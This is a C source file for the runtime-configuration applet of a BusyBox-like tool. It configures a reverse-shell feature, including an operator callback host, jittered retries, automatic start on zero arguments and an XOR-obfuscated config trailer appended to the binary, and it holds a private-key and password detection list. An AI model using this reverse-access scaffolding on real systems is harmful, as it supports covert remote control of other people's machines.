#define _POSIX_C_SOURCE 200809L

#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "applets.h"
#include "json_helpers.h"
#include "runtime_config.h"
#include "sha256.h"

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

#ifndef BB_RUNTIME_MODE
#define BB_RUNTIME_MODE "extract"
#endif
#ifndef BB_RUNTIME_ROOT
#define BB_RUNTIME_ROOT "./.busierbox"
#endif
#ifndef BB_RUNTIME_ALLOW_FALLBACK_ROOT
#define BB_RUNTIME_ALLOW_FALLBACK_ROOT "no"
#endif
#ifndef BB_RUNTIME_FALLBACK_ROOT
#define BB_RUNTIME_FALLBACK_ROOT "/tmp/.busierbox"
#endif
#ifndef BB_ZERO_ARG_MODE
#define BB_ZERO_ARG_MODE "help"
#endif
#ifndef BB_ZERO_ARG_LOG_MODE
#define BB_ZERO_ARG_LOG_MODE "quiet"
#endif
#ifndef BB_ZERO_ARG_CUSTOM_COMMAND
#define BB_ZERO_ARG_CUSTOM_COMMAND ""
#endif
#ifndef BB_RSHELL_TRANSPORT
#define BB_RSHELL_TRANSPORT "ssh"
#endif
#ifndef BB_RSHELL_ENCRYPTION
#define BB_RSHELL_ENCRYPTION "tls"
#endif
#ifndef BB_RSHELL_ALLOW_PLAINTEXT
#define BB_RSHELL_ALLOW_PLAINTEXT "no"
#endif
#ifndef BB_RSHELL_AUTHKEYS_MODE
#define BB_RSHELL_AUTHKEYS_MODE "disabled"
#endif
#ifndef BB_RSHELL_RUN_MODE
#define BB_RSHELL_RUN_MODE "auto"
#endif
#ifndef BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING
#define BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING "no"
#endif
#ifndef BB_RSHELL_SOCAT_PORT
#define BB_RSHELL_SOCAT_PORT "22203"
#endif
#ifndef BB_RSHELL_SHELL_PROVIDER
#define BB_RSHELL_SHELL_PROVIDER "auto"
#endif
#ifndef BB_RSHELL_CUSTOM_SHELL
#define BB_RSHELL_CUSTOM_SHELL ""
#endif
#ifndef BB_RSHELL_RETRY_COUNT
#define BB_RSHELL_RETRY_COUNT "1"
#endif
#ifndef BB_RSHELL_RETRY_INTERVAL_SEC
#define BB_RSHELL_RETRY_INTERVAL_SEC "5"
#endif
#ifndef BB_RSHELL_RETRY_JITTER_PCT
#define BB_RSHELL_RETRY_JITTER_PCT "20"
#endif
#ifndef BB_RSHELL_RETRY_BACKOFF
#define BB_RSHELL_RETRY_BACKOFF "none"
#endif
#ifndef BB_RSHELL_RETRY_MAX_INTERVAL_SEC
#define BB_RSHELL_RETRY_MAX_INTERVAL_SEC "300"
#endif
#ifndef BB_AUTORUN_GUARD_ENABLE
#define BB_AUTORUN_GUARD_ENABLE "yes"
#endif
#ifndef BB_AUTORUN_GUARD_PATH
#define BB_AUTORUN_GUARD_PATH "./.busierbox/run"
#endif
#ifndef BB_AUTORUN_REENTRY_ACTION
#define BB_AUTORUN_REENTRY_ACTION "status"
#endif
#ifndef BB_AUTORUN_STALE_LOCK_POLICY
#define BB_AUTORUN_STALE_LOCK_POLICY "recover"
#endif
#ifndef BB_OPERATOR_REMOTE_FORWARD_PORT
#define BB_OPERATOR_REMOTE_FORWARD_PORT "2200"
#endif
#ifndef BB_OPERATOR_SERVER_HOST
#define BB_OPERATOR_SERVER_HOST ""
#endif
#ifndef BB_OPERATOR_SERVER_USER
#define BB_OPERATOR_SERVER_USER "operator"
#endif
#ifndef BB_OPERATOR_SERVER_SSH_PORT
#define BB_OPERATOR_SERVER_SSH_PORT "22"
#endif
#ifndef BB_OPERATOR_TARGET_BIND_HOST
#define BB_OPERATOR_TARGET_BIND_HOST "127.0.0.1"
#endif
#ifndef BB_OPERATOR_TARGET_DROPBEAR_PORT
#define BB_OPERATOR_TARGET_DROPBEAR_PORT "2222"
#endif
#ifndef BB_OPERATOR_KNOWN_HOSTS_POLICY
#define BB_OPERATOR_KNOWN_HOSTS_POLICY "off"
#endif

struct cfg_entry {
    const char *key;
    const char *compiled;
    char value[256];
    int has_override;
};

static struct cfg_entry cfg[] = {
    {"BB_RUNTIME_MODE", BB_RUNTIME_MODE, "", 0},
    {"BB_RUNTIME_ROOT", BB_RUNTIME_ROOT, "", 0},
    {"BB_RUNTIME_ALLOW_FALLBACK_ROOT", BB_RUNTIME_ALLOW_FALLBACK_ROOT, "", 0},
    {"BB_RUNTIME_FALLBACK_ROOT", BB_RUNTIME_FALLBACK_ROOT, "", 0},
    {"BB_ZERO_ARG_MODE", BB_ZERO_ARG_MODE, "", 0},
    {"BB_ZERO_ARG_LOG_MODE", BB_ZERO_ARG_LOG_MODE, "", 0},
    {"BB_ZERO_ARG_CUSTOM_COMMAND", BB_ZERO_ARG_CUSTOM_COMMAND, "", 0},
    {"BB_RSHELL_TRANSPORT", BB_RSHELL_TRANSPORT, "", 0},
    {"BB_RSHELL_ENCRYPTION", BB_RSHELL_ENCRYPTION, "", 0},
    {"BB_RSHELL_ALLOW_PLAINTEXT", BB_RSHELL_ALLOW_PLAINTEXT, "", 0},
    {"BB_RSHELL_AUTHKEYS_MODE", BB_RSHELL_AUTHKEYS_MODE, "", 0},
    {"BB_RSHELL_RUN_MODE", BB_RSHELL_RUN_MODE, "", 0},
    {"BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING", BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING, "", 0},
    {"BB_RSHELL_SOCAT_PORT", BB_RSHELL_SOCAT_PORT, "", 0},
    {"BB_RSHELL_SHELL_PROVIDER", BB_RSHELL_SHELL_PROVIDER, "", 0},
    {"BB_RSHELL_CUSTOM_SHELL", BB_RSHELL_CUSTOM_SHELL, "", 0},
    {"BB_RSHELL_RETRY_COUNT", BB_RSHELL_RETRY_COUNT, "", 0},
    {"BB_RSHELL_RETRY_INTERVAL_SEC", BB_RSHELL_RETRY_INTERVAL_SEC, "", 0},
    {"BB_RSHELL_RETRY_JITTER_PCT", BB_RSHELL_RETRY_JITTER_PCT, "", 0},
    {"BB_RSHELL_RETRY_BACKOFF", BB_RSHELL_RETRY_BACKOFF, "", 0},
    {"BB_RSHELL_RETRY_MAX_INTERVAL_SEC", BB_RSHELL_RETRY_MAX_INTERVAL_SEC, "", 0},
    {"BB_AUTORUN_GUARD_ENABLE", BB_AUTORUN_GUARD_ENABLE, "", 0},
    {"BB_AUTORUN_GUARD_PATH", BB_AUTORUN_GUARD_PATH, "", 0},
    {"BB_AUTORUN_REENTRY_ACTION", BB_AUTORUN_REENTRY_ACTION, "", 0},
    {"BB_AUTORUN_STALE_LOCK_POLICY", BB_AUTORUN_STALE_LOCK_POLICY, "", 0},
    {"BB_OPERATOR_REMOTE_FORWARD_PORT", BB_OPERATOR_REMOTE_FORWARD_PORT, "", 0},
    {"BB_OPERATOR_SERVER_HOST", BB_OPERATOR_SERVER_HOST, "", 0},
    {"BB_OPERATOR_SERVER_USER", BB_OPERATOR_SERVER_USER, "", 0},
    {"BB_OPERATOR_SERVER_SSH_PORT", BB_OPERATOR_SERVER_SSH_PORT, "", 0},
    {"BB_OPERATOR_TARGET_BIND_HOST", BB_OPERATOR_TARGET_BIND_HOST, "", 0},
    {"BB_OPERATOR_TARGET_DROPBEAR_PORT", BB_OPERATOR_TARGET_DROPBEAR_PORT, "", 0},
    {"BB_OPERATOR_KNOWN_HOSTS_POLICY", BB_OPERATOR_KNOWN_HOSTS_POLICY, "", 0},
};

static int loaded;
static int trailer_present;
static int trailer_valid;
static int override_count;
static char trailer_error[160] = "not loaded";
static char trailer_encoding[16] = "none";

static int hexval(int c)
{
    if (c >= '0' && c <= '9')
        return c - '0';
    if (c >= 'a' && c <= 'f')
        return c - 'a' + 10;
    if (c >= 'A' && c <= 'F')
        return c - 'A' + 10;
    return -1;
}

static int hex_to_bytes(const char *hex, unsigned char *out, size_t outsz, size_t *len_out)
{
    size_t i, n;
    if (!hex)
        return -1;
    n = strlen(hex);
    if (!n || (n % 2) || n / 2 > outsz)
        return -1;
    for (i = 0; i < n; i += 2) {
        int hi = hexval((unsigned char)hex[i]);
        int lo = hexval((unsigned char)hex[i + 1]);
        if (hi < 0 || lo < 0)
            return -1;
        out[i / 2] = (unsigned char)((hi << 4) | lo);
    }
    *len_out = n / 2;
    return 0;
}

static struct cfg_entry *find_entry(const char *key)
{
    size_t i;
    for (i = 0; i < sizeof(cfg) / sizeof(cfg[0]); i++)
        if (!strcmp(cfg[i].key, key))
            return &cfg[i];
    return NULL;
}

static int self_path(char *out, size_t outsz)
{
    ssize_t n = readlink("/proc/self/exe", out, outsz - 1);
    if (n < 0)
        return -1;
    out[n] = '\0';
    return 0;
}

size_t bb_config_file_trailer_span(const char *path)
{
    FILE *fp;
    long fsize;
    char magic[sizeof(BB_CONFIG_TRAILER_MAGIC)];
    size_t magic_len = strlen(BB_CONFIG_TRAILER_MAGIC);
    if (!path)
        return 0;
    fp = fopen(path, "rb");
    if (!fp)
        return 0;
    if (fseek(fp, 0, SEEK_END) != 0 || (fsize = ftell(fp)) < (long)BB_CONFIG_TRAILER_SIZE) {
        fclose(fp);
        return 0;
    }
    if (fseek(fp, fsize - BB_CONFIG_TRAILER_SIZE, SEEK_SET) != 0 ||
        fread(magic, 1, magic_len, fp) != magic_len) {
        fclose(fp);
        return 0;
    }
    fclose(fp);
    return memcmp(magic, BB_CONFIG_TRAILER_MAGIC, magic_len) == 0 ? BB_CONFIG_TRAILER_SIZE : 0;
}

static void set_error(const char *s)
{
    snprintf(trailer_error, sizeof(trailer_error), "%s", s);
}

static int secret_like_value(const char *value)
{
    char upper[256];
    size_t i;
    const char *markers[] = {
        "-----BEGIN OPENSSH PRIVATE KEY-----",
        "-----BEGIN RSA PRIVATE KEY-----",
        "-----BEGIN DSA PRIVATE KEY-----",
        "-----BEGIN EC PRIVATE KEY-----",
        "-----BEGIN PRIVATE KEY-----",
        "PASSWORD=",
        "PASSWD=",
        "TOKEN=",
        "PRIVATE_KEY=",
        NULL
    };
    if (!value)
        return 0;
    for (i = 0; i + 1 < sizeof(upper) && value[i]; i++) {
        unsigned char c = (unsigned char)value[i];
        upper[i] = (char)((c >= 'a' && c <= 'z') ? c - ('a' - 'A') : c);
    }
    upper[i] = '\0';
    for (i = 0; markers[i]; i++)
        if (strstr(upper, markers[i]))
            return 1;
    return 0;
}

static int parse_kv_payload(char *payload)
{
    char *line, *save = NULL;
    int count = 0;
    for (line = strtok_r(payload, "\n", &save); line; line = strtok_r(NULL, "\n", &save)) {
        char *eq;
        struct cfg_entry *ent;
        line[strcspn(line, "\r")] = '\0';
        if (!line[0] || line[0] == '#')
            continue;
        eq = strchr(line, '=');
        if (!eq)
            continue;
        *eq++ = '\0';
        ent = find_entry(line);
        if (!ent)
            continue;
        if (secret_like_value(eq))
            return -1;
        snprintf(ent->value, sizeof(ent->value), "%s", eq);
        ent->has_override = 1;
        count++;
    }
    return count;
}

static void load_config(void)
{
    char path[PATH_MAX];
    unsigned char raw[BB_CONFIG_TRAILER_SIZE + 1];
    unsigned char payload[BB_CONFIG_TRAILER_SIZE + 1];
    char meta[BB_CONFIG_TRAILER_SIZE + 1];
    char *raw_text = (char *)raw;
    char *line, *save = NULL, *payload_start = NULL;
    char version[16] = "", encoding[16] = "plain", payload_format[16] = "raw", sha[65] = "", key_hex[129] = "";
    unsigned long payload_size = 0, payload_offset = 0;
    unsigned char key[64], hash[32];
    char got[65];
    size_t key_len = 0, payload_len = 0;
    FILE *fp;
    long fsize;
    size_t i;

    if (loaded)
        return;
    loaded = 1;
    trailer_present = 0;
    trailer_valid = 0;
    override_count = 0;
    snprintf(trailer_encoding, sizeof(trailer_encoding), "none");
    set_error("absent");

    if (self_path(path, sizeof(path)) != 0)
        return;
    if (!bb_config_file_trailer_span(path))
        return;
    trailer_present = 1;
    snprintf(trailer_encoding, sizeof(trailer_encoding), "unknown");
    set_error("invalid");
    fp = fopen(path, "rb");
    if (!fp)
        return;
    if (fseek(fp, 0, SEEK_END) != 0 || (fsize = ftell(fp)) < (long)BB_CONFIG_TRAILER_SIZE ||
        fseek(fp, fsize - BB_CONFIG_TRAILER_SIZE, SEEK_SET) != 0 ||
        fread(raw, 1, BB_CONFIG_TRAILER_SIZE, fp) != BB_CONFIG_TRAILER_SIZE) {
        fclose(fp);
        return;
    }
    fclose(fp);
    raw[BB_CONFIG_TRAILER_SIZE] = '\0';
    memcpy(meta, raw, BB_CONFIG_TRAILER_SIZE + 1);

    line = strtok_r(meta, "\n", &save);
    if (!line || strcmp(line, BB_CONFIG_TRAILER_MAGIC))
        return;
    snprintf(trailer_encoding, sizeof(trailer_encoding), "%s", encoding);
    while ((line = strtok_r(NULL, "\n", &save)) != NULL) {
        char *eq;
        if (!strcmp(line, "ENDMETA")) {
            payload_start = raw_text + (line + strlen(line) + 1 - meta);
            break;
        }
        eq = strchr(line, '=');
        if (!eq)
            continue;
        *eq++ = '\0';
        if (!strcmp(line, "version"))
            snprintf(version, sizeof(version), "%s", eq);
        else if (!strcmp(line, "encoding"))
            snprintf(encoding, sizeof(encoding), "%s", eq);
        else if (!strcmp(line, "payload_format"))
            snprintf(payload_format, sizeof(payload_format), "%s", eq);
        else if (!strcmp(line, "size"))
            payload_size = strtoul(eq, NULL, 10);
        else if (!strcmp(line, "payload_offset"))
            payload_offset = strtoul(eq, NULL, 10);
        else if (!strcmp(line, "sha256"))
            snprintf(sha, sizeof(sha), "%s", eq);
        else if (!strcmp(line, "key_hex"))
            snprintf(key_hex, sizeof(key_hex), "%s", eq);
    }
    snprintf(trailer_encoding, sizeof(trailer_encoding), "%s", encoding);
    if (strcmp(version, "1")) {
        set_error("unsupported version");
        return;
    }
    if (!payload_start || payload_size == 0 || payload_size >= BB_CONFIG_TRAILER_SIZE || strlen(sha) != 64) {
        set_error("payload bounds invalid");
        return;
    }
    if (payload_offset != (unsigned long)(payload_start - (char *)raw) ||
        payload_offset + payload_size > BB_CONFIG_TRAILER_SIZE) {
        set_error("payload bounds invalid");
        return;
    }
    if (!strcmp(payload_format, "hex")) {
        if (hex_to_bytes(payload_start, payload, sizeof(payload) - 1, &payload_len) != 0 ||
            payload_len == 0 || payload_size != strlen(payload_start)) {
            set_error("invalid hex payload");
            return;
        }
    } else if (!strcmp(payload_format, "raw")) {
        memcpy(payload, payload_start, payload_size);
        payload_len = payload_size;
    } else {
        set_error("unsupported payload format");
        return;
    }
    if (!strcmp(encoding, "xor")) {
        if (hex_to_bytes(key_hex, key, sizeof(key), &key_len) != 0) {
            set_error("invalid xor key");
            return;
        }
        for (i = 0; i < payload_len; i++)
            payload[i] = (unsigned char)(payload[i] ^ key[i % key_len]);
    } else if (strcmp(encoding, "plain")) {
        set_error("unsupported encoding");
        return;
    }
    payload[payload_len] = '\0';
    {
        bb_sha256_ctx ctx;
        bb_sha256_init(&ctx);
        bb_sha256_update(&ctx, payload, payload_len);
        bb_sha256_final(&ctx, hash);
    }
    bb_sha256_hex(hash, got);
    if (strcmp(got, sha)) {
        set_error("checksum mismatch");
        return;
    }
    override_count = parse_kv_payload((char *)payload);
    if (override_count < 0) {
        override_count = 0;
        set_error("secret-like trailer value");
        return;
    }
    trailer_valid = 1;
    set_error("ok");
}

int bb_config_key_allowed(const char *key)
{
    return find_entry(key) != NULL;
}

const char *bb_config_compiled(const char *key)
{
    struct cfg_entry *ent = find_entry(key);
    return ent ? ent->compiled : "";
}

const char *bb_config_get(const char *key)
{
    struct cfg_entry *ent;
    const char *env;
    load_config();
    env = getenv(key);
    if (env && *env)
        return env;
    ent = find_entry(key);
    if (!ent)
        return "";
    return ent->has_override ? ent->value : ent->compiled;
}

int bb_config_trailer_present(void)
{
    load_config();
    return trailer_present;
}

int bb_config_trailer_valid(void)
{
    load_config();
    return trailer_valid;
}

int bb_config_trailer_override_count(void)
{
    load_config();
    return override_count;
}

const char *bb_config_trailer_error(void)
{
    load_config();
    return trailer_error;
}

const char *bb_config_trailer_encoding(void)
{
    load_config();
    return trailer_encoding;
}

static int env_override_count(void)
{
    size_t i;
    int count = 0;
    for (i = 0; i < sizeof(cfg) / sizeof(cfg[0]); i++) {
        const char *env = getenv(cfg[i].key);
        if (env && *env)
            count++;
    }
    return count;
}

const char *bb_config_effective_source(void)
{
    load_config();
    if (env_override_count() > 0)
        return "env";
    if (trailer_valid && override_count > 0)
        return "trailer";
    return "compiled";
}

static void print_config_object(FILE *out, void (*json_string)(FILE *, const char *), int effective)
{
    size_t i;
    fputc('{', out);
    for (i = 0; i < sizeof(cfg) / sizeof(cfg[0]); i++) {
        if (i)
            fputc(',', out);
        json_string(out, cfg[i].key);
        fputc(':', out);
        json_string(out, effective ? bb_config_get(cfg[i].key) : cfg[i].compiled);
    }
    fputc('}', out);
}

void bb_config_print_compiled_json(FILE *out, void (*json_string)(FILE *, const char *))
{
    print_config_object(out, json_string, 0);
}

void bb_config_print_effective_json(FILE *out, void (*json_string)(FILE *, const char *))
{
    print_config_object(out, json_string, 1);
}

void bb_config_print_trailer_json(FILE *out, void (*json_string)(FILE *, const char *))
{
    fprintf(out, "{\"present\":%s,\"valid\":%s,\"encoding\":",
            bb_config_trailer_present() ? "true" : "false",
            bb_config_trailer_valid() ? "true" : "false");
    json_string(out, bb_config_trailer_encoding());
    fprintf(out, ",\"override_count\":%d,\"status\":", bb_config_trailer_override_count());
    json_string(out, bb_config_trailer_error());
    fputc('}', out);
}

void bb_config_print_runtime_summary_json(FILE *out, void (*json_string)(FILE *, const char *))
{
    fprintf(out, "{\"effective_config_source\":");
    json_string(out, bb_config_effective_source());
    fprintf(out, ",\"trailer_override\":");
    bb_config_print_trailer_json(out, json_string);
    fputc('}', out);
}

static void rshell_server_listener(char *out, size_t outsz)
{
    const char *transport = bb_config_get("BB_RSHELL_TRANSPORT");
    const char *encryption = bb_config_get("BB_RSHELL_ENCRYPTION");
    const char *shell_port = bb_config_get("BB_RSHELL_SOCAT_PORT");
    const char *ssh_port = bb_config_get("BB_OPERATOR_SERVER_SSH_PORT");

    if (!strcmp(transport, "ssh"))
        snprintf(out, outsz, "scripts/busierbox-server --transport ssh --ssh-port %s", ssh_port);
    else if (!strcmp(encryption, "none"))
        snprintf(out, outsz, "scripts/busierbox-server --transport plain-shell --shell-port %s", shell_port);
    else
        snprintf(out, outsz, "scripts/busierbox-server --transport tls-shell --shell-port %s", shell_port);
}

static void rshell_connect_hint(char *out, size_t outsz)
{
    const char *transport = bb_config_get("BB_RSHELL_TRANSPORT");
    const char *remote_forward_port = bb_config_get("BB_OPERATOR_REMOTE_FORWARD_PORT");

    if (!strcmp(transport, "ssh"))
        snprintf(out, outsz, "ssh -p %s root@127.0.0.1", remote_forward_port);
    else if (!strcmp(transport, "none"))
        snprintf(out, outsz, "reverse access disabled");
    else
        snprintf(out, outsz, "shell stream is attached by scripts/busierbox-server");
}

void bb_config_print_rshell_readiness_json(FILE *out, void (*json_string)(FILE *, const char *))
{
    const char *transport = bb_config_get("BB_RSHELL_TRANSPORT");
    const char *encryption = bb_config_get("BB_RSHELL_ENCRYPTION");
    const char *run_mode = bb_config_get("BB_RSHELL_RUN_MODE");
    const char *zero_arg_mode = bb_config_get("BB_ZERO_ARG_MODE");
    const char *operator_host = bb_config_get("BB_OPERATOR_SERVER_HOST");
    const char *shell_port = bb_config_get("BB_RSHELL_SOCAT_PORT");
    const char *ssh_port = bb_config_get("BB_OPERATOR_SERVER_SSH_PORT");
    const char *remote_forward_port = bb_config_get("BB_OPERATOR_REMOTE_FORWARD_PORT");
    const char *target_bind_host = bb_config_get("BB_OPERATOR_TARGET_BIND_HOST");
    const char *target_dropbear_port = bb_config_get("BB_OPERATOR_TARGET_DROPBEAR_PORT");
    char server[256], hint[256], target_dropbear[256];
    int warning_count = 0;

    rshell_server_listener(server, sizeof(server));
    rshell_connect_hint(hint, sizeof(hint));
    snprintf(target_dropbear, sizeof(target_dropbear), "%s:%s", target_bind_host, target_dropbear_port);

    fprintf(out, "{\"enabled\":%s", strcmp(transport, "none") ? "true" : "false");
    fprintf(out, ",\"transport\":");
    json_string(out, transport);
    fprintf(out, ",\"encryption\":");
    json_string(out, encryption);
    fprintf(out, ",\"run_mode\":");
    json_string(out, run_mode);
    fprintf(out, ",\"zero_arg_autorun\":%s", !strcmp(zero_arg_mode, "rshell") ? "true" : "false");
    fprintf(out, ",\"operator_host_set\":%s", operator_host[0] ? "true" : "false");
    fprintf(out, ",\"operator_host\":");
    json_string(out, operator_host);
    fprintf(out, ",\"operator_shell_port\":");
    json_string(out, shell_port);
    fprintf(out, ",\"operator_ssh_port\":");
    json_string(out, ssh_port);
    fprintf(out, ",\"remote_forward_port\":");
    json_string(out, remote_forward_port);
    fprintf(out, ",\"target_dropbear\":");
    json_string(out, target_dropbear);
    fprintf(out, ",\"server_listener\":");
    json_string(out, server);
    fprintf(out, ",\"connect_hint\":");
    json_string(out, hint);
    fprintf(out, ",\"warnings\":[");
    if (!strcmp(transport, "none")) {
        json_string(out, "reverse access disabled");
        warning_count++;
    }
    if (strcmp(transport, "none") && !operator_host[0]) {
        if (warning_count++)
            fputc(',', out);
        json_string(out, "operator host is not configured");
    }
    if (strcmp(transport, "none") && strcmp(zero_arg_mode, "rshell")) {
        if (warning_count++)
            fputc(',', out);
        json_string(out, "zero-arg execution will not start reverse access");
    }
    if (strcmp(transport, "ssh") && !strcmp(encryption, "none")) {
        if (warning_count++)
            fputc(',', out);
        json_string(out, "plaintext shell transport is insecure/debug-only");
    }
    fprintf(out, "]}");
}

int applet_runtime_config_main(int argc, char **argv)
{
    int json = 0;
    int i;
    size_t j;

    if (argc > 1 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h"))) {
        puts("usage: busierbox runtime-config [--json]");
        puts("Print compiled, trailer, environment, and effective runtime configuration.");
        return 0;
    }
    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--json"))
            json = 1;
        else {
            fprintf(stderr, "runtime-config: unknown option %s\n", argv[i]);
            return 2;
        }
    }
    if (json) {
        fputs("{\"schema\":1,\"effective_config_source\":", stdout);
        bb_json_string(stdout, bb_config_effective_source());
        fputs(",\"trailer_override\":", stdout);
        bb_config_print_trailer_json(stdout, bb_json_string);
        fprintf(stdout, ",\"environment_override_count\":%d", env_override_count());
        fputs(",\"compiled_config\":", stdout);
        bb_config_print_compiled_json(stdout, bb_json_string);
        fputs(",\"effective_config\":", stdout);
        bb_config_print_effective_json(stdout, bb_json_string);
        fputs("}\n", stdout);
        return 0;
    }
    printf("effective_config_source=%s\n", bb_config_effective_source());
    printf("trailer_present=%s\n", bb_config_trailer_present() ? "yes" : "no");
    printf("trailer_valid=%s\n", bb_config_trailer_valid() ? "yes" : "no");
    printf("trailer_encoding=%s\n", bb_config_trailer_encoding());
    printf("trailer_override_count=%d\n", bb_config_trailer_override_count());
    printf("trailer_status=%s\n", bb_config_trailer_error());
    printf("environment_override_count=%d\n", env_override_count());
    for (j = 0; j < sizeof(cfg) / sizeof(cfg[0]); j++) {
        printf("compiled_%s=%s\n", cfg[j].key, cfg[j].compiled);
        printf("effective_%s=%s\n", cfg[j].key, bb_config_get(cfg[j].key));
    }
    return 0;
}
